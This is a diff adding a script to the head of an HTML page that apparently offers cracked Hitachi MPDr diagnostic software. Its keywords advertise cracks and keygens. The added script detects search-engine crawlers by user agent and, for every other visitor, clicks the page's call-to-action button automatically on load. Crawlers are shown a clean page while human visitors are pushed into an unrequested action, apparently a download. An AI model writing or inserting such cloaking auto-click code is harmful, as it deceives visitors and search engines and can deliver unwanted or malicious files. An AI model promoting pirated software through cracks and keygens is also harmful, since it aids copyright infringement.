@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hitachi MPDr Tier-4 v3.33.5 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Hitachi MPDr Tier-4 v3.33.5 2024 diagnostic software for monitoring hydraulic pressure, oil temperature, and engine speed with support for various models.">
     <meta name="keywords" content="Hitachi MPDr Tier-4 v3.33.5 2024, Hitachi MPDr diagnostic software, Hitachi MPDr 2024 download, Hitachi MPDr v3.33.5 free download, Hitachi MPDr Tier-4 crack, Hitachi MPDr Tier-4 keygen, Hitachi MPDr v3.33.5 crack, Hitachi MPDr v3.33.5 keygen, Hitachi DS-3500 support, Hitachi MDT-5000 support, Hitachi VCI-300 support, Hitachi DMT-200 support, Hitachi OBD-II PRO support, Hitachi diagnostic software, Hitachi maintenance software, excavator software download, Hitachi MPDr русский, Hitachi MPDr скачать бесплатно, Hitachi MPDr diagnostics software, Hitachi MPDr diagnostics software download free, Hitachi MPDr diagnostics software high speed download, Hitachi MPDr программа диагностики, Hitachi MPDr скачать, Hitachi MPDr без регистрации, Hitachi MPDr українською, Hitachi MPDr завантажити, Hitachi MPDr файл, Hydraulic Excavator software, Rigid Dump Truck diagnostics, Wheel Loader software, Hitachi EPC 2024, Hitachi EPC download 2024">
     <style>
